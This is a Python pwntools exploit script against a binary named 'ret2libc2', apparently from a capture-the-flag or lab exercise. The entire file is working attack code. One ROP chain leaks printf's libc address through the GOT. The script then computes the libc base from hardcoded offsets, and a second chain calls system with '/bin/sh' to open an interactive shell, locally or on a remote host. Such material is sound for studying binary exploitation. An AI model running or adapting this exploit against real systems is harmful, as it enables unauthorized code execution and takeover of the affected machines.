#!/usr/bin/env python3

from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('?', payload)
    # Wait for the process to crash
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

gdbscript = '''
init-pwndbg
break *0x00000000004011c8
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2libc2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

offset = 9
io = start()
pop_rdi = 0x401233
ret = 0x40101a

# leak libc
payload = flat({
    offset: [
        pop_rdi,
        elf.got.printf,
        ret,             # stack alignment
        elf.plt.printf,
        ret,
        elf.symbols.main
    ]
})
io.sendlineafter('>', payload)
io.recv()

# Leaked printf addr
leaked_printf = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("Leaked: %#x", leaked_printf)

libc_base = leaked_printf - 0x064e40

binsh = libc_base + 0x1b3d88
system = libc_base + 0x04f420

# 2nd payload
payload = flat({
    offset: [
        pop_rdi,     
        binsh, 
        ret,    
        system, 
    ]
})

io.sendline(payload)
io.interactive()
